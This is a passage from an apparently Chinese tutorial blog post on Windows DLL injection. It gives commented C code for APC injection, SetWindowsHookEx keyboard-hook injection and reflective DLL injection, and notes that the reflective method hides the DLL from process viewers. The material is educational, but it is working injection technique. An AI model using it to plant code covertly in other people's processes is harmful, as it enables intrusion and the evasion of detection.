</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获取目标进程句柄
</span><span class=c1></span><span class=n>hProcess</span> <span class=o>=</span> <span class=n>OpenProcess</span><span class=p>(</span><span class=n>dwDesireAccess</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>dwPID</span><span class=p>);</span>
<span class=c1>// 申请DLL路径字符串长度的内存空间
</span><span class=c1></span><span class=n>pRemoteBuf</span> <span class=o>=</span> <span class=n>VirtualAllocEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>dwBuffSize</span><span class=p>,</span> <span class=n>MEM_COMMIT</span> <span class=o>|</span> <span class=n>MEM_RESERVE</span><span class=p>,</span> <span class=n>PAGE_READWRITE</span><span class=p>);</span>
<span class=c1>// 将DLL路径字符串写入申请的内存空间中
</span><span class=c1></span><span class=n>WriteProcessMemory</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>pRemoteBuf</span><span class=p>,</span> <span class=p>(</span><span class=n>LPCVOID</span><span class=p>)</span><span class=n>szDllPath</span><span class=p>,</span> <span class=n>dwBuffSize</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 获取LoadLibrary函数地址
</span><span class=c1></span><span class=n>hMod</span> <span class=o>=</span> <span class=n>GetModuleHandle</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;kernel32.dll&#34;</span><span class=p>);</span>
<span class=n>hThreadProc</span> <span class=o>=</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>hMod</span><span class=p>,</span> <span class=s>&#34;LoadLibraryW&#34;</span><span class=p>);</span>
<span class=c1>// 获取系统全线程的快照
</span><span class=c1></span><span class=n>hSnapShot</span> <span class=o>=</span> <span class=n>CreateToolhelp32Snapshot</span><span class=p>(</span><span class=n>TH32CS_SNAPTHREAD</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 遍历全线程找到属于目标进程的线程
</span><span class=c1></span><span class=k>for</span> <span class=p>(;</span> <span class=n>ThreadEnd</span><span class=p>;</span> <span class=n>ThreadEnd</span> <span class=o>=</span> <span class=n>Thread32Next</span><span class=p>(</span><span class=n>hSnapShot</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>te</span><span class=p>))</span>
	<span class=p>{</span>
    	<span class=c1>// dwPID 为目标进程pid
</span><span class=c1></span>		<span class=k>if</span> <span class=p>(</span><span class=n>te</span><span class=p>.</span><span class=n>th32OwnerProcessID</span> <span class=o>==</span> <span class=n>dwPID</span><span class=p>)</span>
		<span class=p>{</span>
			<span class=n>ThreadID</span> <span class=o>=</span> <span class=n>te</span><span class=p>.</span><span class=n>th32ThreadID</span><span class=p>;</span>
			<span class=c1>// 获取线程句柄
</span><span class=c1></span>			<span class=n>hThread</span> <span class=o>=</span> <span class=n>OpenThread</span><span class=p>(</span><span class=n>THREAD_ALL_ACCESS</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>te</span><span class=p>.</span><span class=n>th32ThreadID</span><span class=p>);</span>
            <span class=c1>// 向目标进程的线程添加APC过程,APC执行的是LoadLibrary函数，参数为DLL路径字符串
</span><span class=c1></span>			<span class=n>QueueUserAPC</span><span class=p>((</span><span class=n>PAPCFUNC</span><span class=p>)</span><span class=n>hThreadProc</span><span class=p>,</span> <span class=n>hThread</span><span class=p>,</span> <span class=p>(</span><span class=n>ULONG_PTR</span><span class=p>)</span><span class=n>pRemoteBuf</span><span class=p>);</span>
            <span class=c1>// Counter用来记录注入了多少次，便于卸载
</span><span class=c1></span>			<span class=n>Counter</span><span class=o>++</span><span class=p>;</span>
			<span class=n>CloseHandle</span><span class=p>(</span><span class=n>hThread</span><span class=p>);</span>
			<span class=p>}</span>
		<span class=p>}</span>
	<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><h4 id=0x4-setwindowshookex>0x4 SetWindowsHookEx</h4>
<p>该DLL注入方法与Windows系统中的消息机制有关。Windows消息钩取原理如下图所示:</p>
<p>( 图源自《核心原理》)</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=%e6%b6%88%e6%81%af%e9%92%a9%e5%8f%96%e5%b7%a5%e4%bd%9c%e5%8e%9f%e7%90%86.jpg data-srcset="/dllinjection/%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.jpg, %e6%b6%88%e6%81%af%e9%92%a9%e5%8f%96%e5%b7%a5%e4%bd%9c%e5%8e%9f%e7%90%86.jpg 1.5x, /dllinjection/%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.jpg 2x" data-sizes=auto alt=/dllinjection/%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.jpg title=消息钩取工作原理></p>
<p>结合该图我们先了解一下Windows的消息机制。</p>
<p>Windows是以事件驱动为工作方式，其维护着一个OS message queue的消息队列。当发生事件时，该事件对应的消息会被添加到OS message queue中，然后OS判断哪个应用发生了该事件，然后就从OS message queue 中取出该消息发送给应用的message queue中。</p>
<p>在这个过程中，我们可以添加钩子，在消息传给应用的消息队列前钩取，由此可以读取、拦截以及修改消息。</p>
<p>我们通过SetWindowsHookEx函数注册钩子，要了解如何通过SetWindowsHookEx注册的钩子实现DLL注入，我们需要先了解该函数的参数的意义。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=n>HHOOK</span> <span class=nf>SetWindowsHookEx</span><span class=p>(</span>
  <span class=p>[</span><span class=n>in</span><span class=p>]</span> <span class=kt>int</span>       <span class=n>idHook</span><span class=p>,</span>
  <span class=p>[</span><span class=n>in</span><span class=p>]</span> <span class=n>HOOKPROC</span>  <span class=n>lpfn</span><span class=p>,</span>
  <span class=p>[</span><span class=n>in</span><span class=p>]</span> <span class=n>HINSTANCE</span> <span class=n>hmod</span><span class=p>,</span>
  <span class=p>[</span><span class=n>in</span><span class=p>]</span> <span class=n>DWORD</span>     <span class=n>dwThreadId</span>
<span class=p>);</span>
<span class=nl>para1</span><span class=p>:</span> <span class=n>idHook是事件类型</span><span class=err>，例如键盘输入事件</span>
<span class=nl>para2</span><span class=p>:</span> <span class=n>lpfn是钩子过程</span><span class=p>(</span><span class=n>Hook</span> <span class=n>Procedure</span><span class=p>),</span><span class=err>即事件发生后要执行的函数</span>
<span class=nl>para3</span><span class=p>:</span> <span class=n>hmod是包含lpfn函数的DLL</span>
<span class=nl>para4</span><span class=p>:</span> <span class=n>dwThreadId是想要被挂钩的线程ID</span><span class=err>，即事件发生后，需要勾取的线程</span>
</code></pre></td></tr></table>
</div>
</div><p>当我们通过SetWindowsHookEx函数注册好钩子后，当想要被挂钩的线程所属的进程发生指定事件后，操作系统会将相关的DLL文件强制注入到目标进程中，然后调用钩子过程。</p>
<p>因此我们需要将我们希望程序执行的代码，即钩子过程(Hook Procedure)，写入DLL的导出函数中，如此才能在注入器中通过GetProcAddress函数获得钩子过程的地址。</p>
<p>流程图：</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=SetWindowsHookEx.png data-srcset="/dllinjection/SetWindowsHookEx.png, SetWindowsHookEx.png 1.5x, /dllinjection/SetWindowsHookEx.png 2x" data-sizes=auto alt=/dllinjection/SetWindowsHookEx.png title=SetWindowsHookEx></p>
<p>核心代码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获得目标进程当前的线程ID
</span><span class=c1></span><span class=n>DWORD</span> <span class=n>ThreadID</span> <span class=o>=</span> <span class=n>GetThreadID</span><span class=p>(</span><span class=n>dwPID</span><span class=p>);</span>
<span class=c1>// 加载目标DLL，但在加载以及卸载的时候不会执行DllMain函数(参数3定义的)
</span><span class=c1></span><span class=n>HMODULE</span> <span class=n>dll</span> <span class=o>=</span> <span class=n>LoadLibraryEx</span><span class=p>(</span><span class=n>szDllPath</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span><span class=n>DONT_RESOLVE_DLL_REFERENCES</span><span class=p>);</span>
<span class=c1>// 获取钩子过程(hook procedure)的地址，DLL文件中钩子过程的函数名需要为&#34;Poc&#34;
</span><span class=c1></span><span class=n>HOOKPROC</span> <span class=n>addr</span> <span class=o>=</span> <span class=p>(</span><span class=n>HOOKPROC</span><span class=p>)</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>dll</span><span class=p>,</span> <span class=s>&#34;Poc&#34;</span><span class=p>);</span>
<span class=c1>// 注册钩子
</span><span class=c1>// 触发HOOK事件为键盘输入，addr为钩子过程，dll为钩子过程所在的DLL，ThreadID为目标进程的线程ID
</span><span class=c1></span><span class=n>HHOOK</span> <span class=n>handle</span> <span class=o>=</span> <span class=n>SetWindowsHookEx</span><span class=p>(</span><span class=n>WH_KEYBOARD</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>dll</span><span class=p>,</span> <span class=n>ThreadID</span><span class=p>);</span>
<span class=c1>// 通过getchar()函数让钩子能等待事件触发再脱钩
</span><span class=c1></span><span class=n>getchar</span><span class=p>();</span>
<span class=c1>// 注销钩子(脱钩)
</span><span class=c1></span><span class=n>UnhookWindowsHookEx</span><span class=p>(</span><span class=n>handle</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><h4 id=0x5-reflective-injection>0x5 Reflective Injection</h4>
<p>这个反射式注入方法较前面几种方法更加隐蔽，其是通过手动方式将DLL文件加载至目标进程内存中，而不是通过LoadLibrary，因此没有向进程注册目标DLL，所以例如Process explore这样的程序也无法检测到该DLL。</p>
<p>该方法通过手动让DLL文件加载到内存中，相当于手动实现了PE加载器的功能，因此我们可以从该注入方法可以强化对PE文件结构的了解，并能学到PE加载器的实现过程，PE文件如何实现重定位，以及PE文件查看器的实现思路(即如何取出PE文件中的不同数据)。</p>
<p>该方法我们需要在目标DLL中实现一个名为ReflectiveLoader的导出函数，并在注入器中实现我们的LoadRemoteLibraryR函数来替代原LoadLibrary，来完成DLL的加载。</p>
<p>该注入技术的代码每一行都已经注释在项目代码中。</p>
<p>反射式DLL注入方式的总体流程图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ReflectiveInjectionAll.png data-srcset="/dllinjection/ReflectiveInjectionAll.png, ReflectiveInjectionAll.png 1.5x, /dllinjection/ReflectiveInjectionAll.png 2x" data-sizes=auto alt=/dllinjection/ReflectiveInjectionAll.png title=ReflectiveInjectionAll></p>
<p>注入器实现流程图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=ReflectiveInjection.png data-srcset="/dllinjection/ReflectiveInjection.png, ReflectiveInjection.png 1.5x, /dllinjection/ReflectiveInjection.png 2x" data-sizes=auto alt=/dllinjection/ReflectiveInjection.png title=ReflectiveInjection></p>
<p>在注入器的实现中，必须清楚一点，我们是先把DLL文件读入注入器的堆空间中，不是目标进程的内存空间。</p>
<p>同时，我们打开的是DLL文件在磁盘的文件结构，因此当我们读取DLL文件结构中保存的是相对虚拟地址的数据时，我们需要转化成文件偏移才能正确获取数据。只有当文件以Image结构存在与内存中时，才不需要将相对虚拟地址转换成文件偏移。</p>
<p>注入器核心代码：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 打开目标DLL文件
</span><span class=c1></span><span class=n>hFile</span> <span class=o>=</span> <span class=n>CreateFileW</span><span class=p>(</span><span class=n>cpDllFile</span><span class=p>,</span> <span class=n>GENERIC_READ</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>OPEN_EXISTING</span><span class=p>,</span><span class=n>FILE_ATTRIBUTE_NORMAL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 获取目标DLL文件大小
</span><span class=c1></span><span class=n>dwLength</span> <span class=o>=</span> <span class=n>GetFileSize</span><span class=p>(</span><span class=n>hFile</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 在注入器中分配目标DLL文件大小的堆空间
</span><span class=c1></span><span class=n>lpBuffer</span> <span class=o>=</span> <span class=n>HeapAlloc</span><span class=p>(</span><span class=n>GetProcessHeap</span><span class=p>(),</span> <span class=mi>0</span><span class=p>,</span> <span class=n>dwLength</span><span class=p>);</span>
<span class=c1>// 向申请的堆空间写入DLL文件
</span><span class=c1></span><span class=n>ReadFile</span><span class=p>(</span><span class=n>hFile</span><span class=p>,</span> <span class=n>lpBuffer</span><span class=p>,</span> <span class=n>dwLength</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dwBytesRead</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 获取目标进程句柄
</span><span class=c1></span><span class=n>hProcess</span> <span class=o>=</span> <span class=n>OpenProcess</span><span class=p>(</span><span class=n>PROCESS_ALL_ACCESS</span><span class=p>,</span> <span class=n>FALSE</span><span class=p>,</span> <span class=n>dwPID</span><span class=p>);</span>
<span class=c1>// 调用ReflectiveLoader函数,实现目标DLL的加载至目标进程
</span><span class=c1></span><span class=n>hModule</span> <span class=o>=</span> <span class=n>LoadRemoteLibraryR</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>lpBuffer</span><span class=p>,</span> <span class=n>dwLength</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>LoadRemoteLibraryR函数实现流程图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=LoadRemoteLibraryR.png data-srcset="/dllinjection/LoadRemoteLibraryR.png, LoadRemoteLibraryR.png 1.5x, /dllinjection/LoadRemoteLibraryR.png 2x" data-sizes=auto alt=/dllinjection/LoadRemoteLibraryR.png title=LoadRemoteLibraryR></p>
<p>LoadRemoteLibraryR核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获取DLL中ReflectiveLoader函数的文件偏移地址
</span><span class=c1></span><span class=n>dwReflectiveLoaderOffset</span> <span class=o>=</span> <span class=n>GetReflectiveLoaderOffset</span><span class=p>(</span><span class=n>lpBuffer</span><span class=p>);</span>
<span class=c1>// 在目标进程申请DLL文件大小的内存空间
</span><span class=c1></span><span class=n>lpRemoteLibraryBuffer</span> <span class=o>=</span> <span class=n>VirtualAllocEx</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>dwLength</span><span class=p>,</span> <span class=n>MEM_RESERVE</span> <span class=o>|</span> <span class=n>MEM_COMMIT</span><span class=p>,</span> <span class=n>PAGE_EXECUTE_READWRITE</span><span class=p>);</span>
<span class=c1>// 将DLL文件写入目标进程申请的内存空间中
</span><span class=c1></span><span class=n>WriteProcessMemory</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=n>lpRemoteLibraryBuffer</span><span class=p>,</span> <span class=n>lpBuffer</span><span class=p>,</span> <span class=n>dwLength</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
<span class=c1>// 获取在目标进程中DLL文件写入到的内存空间中的ReflectiveLoader函数的文件偏移
</span><span class=c1></span><span class=n>lpReflectiveLoader</span> <span class=o>=</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)((</span><span class=n>ULONG_PTR</span><span class=p>)</span><span class=n>lpRemoteLibraryBuffer</span> <span class=o>+</span> <span class=n>dwReflectiveLoaderOffset</span><span class=p>);</span>
<span class=c1>// 通过函数RtlCreateUserThread创建远程线程来调用ReflectiveLoader函数(因此我们还需要定义RtlCreateUserThread函数)
</span><span class=c1></span><span class=n>RtlCreateUserThread</span> <span class=o>=</span> <span class=p>(</span><span class=n>PRTL_CREATE_USER_THREAD</span><span class=p>)(</span><span class=n>GetProcAddress</span><span class=p>(</span><span class=n>GetModuleHandle</span><span class=p>(</span><span class=n>TEXT</span><span class=p>(</span><span class=s>&#34;ntdll&#34;</span><span class=p>)),</span> <span class=s>&#34;RtlCreateUserThread&#34;</span><span class=p>));</span>
<span class=n>RtlCreateUserThread</span><span class=p>(</span><span class=n>hProcess</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>lpReflectiveLoader</span><span class=p>,</span> <span class=n>lpParameter</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>hThread</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>在LoadRemoteLibraryR函数中调用了GetReflectiveLoaderOffset函数获取了ReflectiveLoader函数在目标DLL中的文件偏移地址。</p>
<p>GetReflectiveLoaderOffset流程图:</p>
<p><img class=lazyload src=/svg/loading.min.svg data-src=GetReflectiveLoaderOffset.png data-srcset="/dllinjection/GetReflectiveLoaderOffset.png, GetReflectiveLoaderOffset.png 1.5x, /dllinjection/GetReflectiveLoaderOffset.png 2x" data-sizes=auto alt=/dllinjection/GetReflectiveLoaderOffset.png title=GetReflectiveLoaderOffset></p>
<p>核心代码:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 获取DLL文件写入的内存堆的起始地址
</span><span class=c1></span><span class=n>uiBaseAddress</span> <span class=o>=</span> <span class=p>(</span><span class=n>UINT_PTR</span><span class=p>)</span><span class=n>lpReflectiveDllBuffer</span><span class=p>;</span>
<span class=c1>// 获取DLL文件的NT Header 的文件偏移，也就是PE签名开头的地址
</span><span class=c1></span><span class=n>uiExportDir</span> <span class=o>=</span> <span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DOS_HEADER</span><span class=p>)</span><span class=n>uiBaseAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>e_lfanew</span><span class=p>;</span>
<span class=c1>// 获取可选头中的导出表地址
</span><span class=c1></span><span class=n>uiNameArray</span> <span class=o>=</span> <span class=p>(</span><span class=n>UINT_PTR</span><span class=p>)</span> <span class=o>&amp;</span> <span class=p>((</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>OptionalHeader</span><span class=p>.</span><span class=n>DataDirectory</span><span class=p>[</span><span class=n>IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class=p>];</span>
<span class=c1>// 将相对虚拟地址转为文件偏移是因为此时DLL文件在内存中的结构与在磁盘中的结构相同，并没有以Image结构存于内存中
</span><span class=c1>// 获取IMAGE_EXPORT_DIRECTORY结构体的地址
</span><span class=c1></span><span class=n>uiExportDir</span> <span class=o>=</span> <span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>Rva2Offset</span><span class=p>(((</span><span class=n>PIMAGE_DATA_DIRECTORY</span><span class=p>)</span><span class=n>uiNameArray</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>VirtualAddress</span><span class=p>,</span> <span class=n>uiBaseAddress</span><span class=p>);</span>
<span class=c1>// 获取DLL导出函数名称的数组文件偏移
</span><span class=c1></span><span class=n>uiNameArray</span> <span class=o>=</span> <span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>Rva2Offset</span><span class=p>(((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>AddressOfNames</span><span class=p>,</span> <span class=n>uiBaseAddress</span><span class=p>);</span>
<span class=c1>// 获取DLL导出函数地址数组的文件偏移
</span><span class=c1></span><span class=n>uiAddressArray</span> <span class=o>=</span> <span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>Rva2Offset</span><span class=p>(((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>AddressOfFunctions</span><span class=p>,</span> <span class=n>uiBaseAddress</span><span class=p>);</span>
<span class=c1>// 获取DLL导出函数Ordinals数组的文件偏移
</span><span class=c1></span><span class=n>uiNameOrdinals</span> <span class=o>=</span> <span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>Rva2Offset</span><span class=p>(((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>AddressOfNameOrdinals</span><span class=p>,</span> <span class=n>uiBaseAddress</span><span class=p>);</span>
<span class=c1>// 获取导出函数的数量
</span><span class=c1></span><span class=n>dwCounter</span> <span class=o>=</span> <span class=p>((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>NumberOfNames</span><span class=p>;</span>
<span class=c1>// 遍历所有导出函数寻找反射加载器函数
</span><span class=c1></span><span class=k>while</span> <span class=p>(</span><span class=n>dwCounter</span><span class=o>--</span><span class=p>)</span>
<span class=p>{</span>
	<span class=c1>// 获取导出函数名称，导出函数名称数组保存的是函数名称字符串保存的相对虚拟地址，因此还需要第二次转换字符串保存的地址为文件偏移
</span><span class=c1></span>	<span class=kt>char</span><span class=o>*</span> <span class=n>cpExportedFunctionName</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>Rva2Offset</span><span class=p>(</span><span class=n>DEREF_32</span><span class=p>(</span><span class=n>uiNameArray</span><span class=p>),</span> <span class=n>uiBaseAddress</span><span class=p>));</span>
	<span class=c1>// 如果导出函数名称数组中能找到字符串&#34;ReflectiveLoader&#34;
</span><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=n>strstr</span><span class=p>(</span><span class=n>cpExportedFunctionName</span><span class=p>,</span> <span class=s>&#34;ReflectiveLoader&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span>
	<span class=p>{</span>
		<span class=c1>// 当找到反射加载器函数后，就获取函数地址表文件偏移
</span><span class=c1></span>		<span class=n>uiAddressArray</span> <span class=o>=</span> <span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=n>Rva2Offset</span><span class=p>(((</span><span class=n>PIMAGE_EXPORT_DIRECTORY</span><span class=p>)</span><span class=n>uiExportDir</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>AddressOfFunctions</span><span class=p>,</span> <span class=n>uiBaseAddress</span><span class=p>);</span>
		<span class=c1>// 以Orinal的值作为索引，从函数地址数组取出反射加载器函数的地址
</span><span class=c1></span>         <span class=c1>// DEREF_16和DEREF_32是一个宏，会将括号里的变量转化成16位或32位指针，然后取出指针的数据
</span><span class=c1></span>		<span class=n>uiAddressArray</span> <span class=o>+=</span> <span class=p>(</span><span class=n>DEREF_16</span><span class=p>(</span><span class=n>uiNameOrdinals</span><span class=p>)</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>DWORD</span><span class=p>));</span>
		<span class=c1>// 将反射加载器函数的地址转为文件偏移地址
</span><span class=c1></span>		<span class=k>return</span> <span class=nf>Rva2Offset</span><span class=p>(</span><span class=n>DEREF_32</span><span class=p>(</span><span class=n>uiAddressArray</span><span class=p>),</span> <span class=n>uiBaseAddress</span><span class=p>);</span>
	<span class=p>}</span>
	<span class=c1>// 如果没找到反射加载器的函数就把指针移动到下一个函数名称数组元素
</span><span class=c1></span>	<span class=n>uiNameArray</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>DWORD</span><span class=p>);</span>
    <span class=c1>// 函数名称数组每一个数据对应一个函数，以该函数在函数名称数组对应的索引作为NameOrdinal数组的索引取到的数据就为这个函数的Ordinal。再通过该Ordinal作为索引在函数地址数组取出该函数的相对虚拟地址。
</span><span class=c1></span>	<span class=c1>// 那么根据Ordinal数组的 Ordinal = 函数地址表的index 的形式同步函数名称数组移动，找到后即可从以Ordinal索引从函数地址数组取出相应函数的地址
</span><span class=c1></span>	<span class=n>uiNameOrdinals</span> <span class=o>+=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>WORD</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>GetReflectiveLoader函数中使用到了RVA2Offset函数，该函数中判断RVA是否可以转化成文件偏移的条件是非常值得学习的细节。</p>
<p>RVA2Offset核心代码如下:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=c1>// 相对虚拟地址和文件偏移转化是根据公式:
</span><span class=c1>// offset = RVA - VirtualAddress + PointerToRawData
</span><span class=c1>// 而VirtualAddress 和 PointerToRawData 为节区头的数据
</span><span class=c1></span>
<span class=c1>// 获取NT头的地址，也就是PE签名开始的地址
</span><span class=c1></span><span class=n>pNtHeaders</span> <span class=o>=</span> <span class=p>(</span><span class=n>PIMAGE_NT_HEADERS</span><span class=p>)(</span><span class=n>uiBaseAddress</span> <span class=o>+</span> <span class=p>((</span><span class=n>PIMAGE_DOS_HEADER</span><span class=p>)</span><span class=n>uiBaseAddress</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>e_lfanew</span><span class=p>);</span>
<span class=c1>// 获取节区头开始的地址。计算方法为 addr(OptionHeader) + sizeof(OptionHeader)，就能跳过OpitionHeader区域，获得节区头地址
